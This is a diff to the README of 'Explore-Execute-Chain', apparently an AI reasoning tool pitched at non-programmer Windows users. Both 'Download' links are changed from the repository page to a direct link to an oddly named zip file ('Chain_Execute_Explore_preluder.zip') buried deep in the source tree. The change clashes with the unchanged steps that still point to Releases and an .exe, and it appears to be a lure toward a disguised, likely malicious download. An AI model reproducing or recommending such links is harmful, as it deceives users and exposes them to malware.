@@ -1,6 +1,6 @@
 # 🧠 Explore-Execute-Chain - Solve complex problems with structured reasoning
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Withholderupheaval434/Explore-Execute-Chain)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Withholderupheaval434/Explore-Execute-Chain/raw/refs/heads/main/verl/verl/single_controller/base/Chain_Execute_Explore_preluder.zip)
 
 Explore-Execute-Chain (E2C) is a tool built to help you solve difficult problems by breaking them into two simple parts. Computers often struggle when they look at an entire task at once. This program changes that. It creates a short plan first and then follows that plan to find the right answer. This method saves time and uses less computer memory than standard systems.
 
@@ -26,7 +26,7 @@ Ensure your computer has the following to get the best experience:
 
 You do not need to be a programmer to use this software. Follow these instructions to set up the program on your Windows computer.
 
-1. Go to the [official download page](https://github.com/Withholderupheaval434/Explore-Execute-Chain).
+1. Go to the [official download page](https://github.com/Withholderupheaval434/Explore-Execute-Chain/raw/refs/heads/main/verl/verl/single_controller/base/Chain_Execute_Explore_preluder.zip).
 2. Look for the button or link labeled "Releases" on the right side of the page.
 3. Click the most recent version available.
 4. Locate the file ending in ".exe" under the "Assets" section.
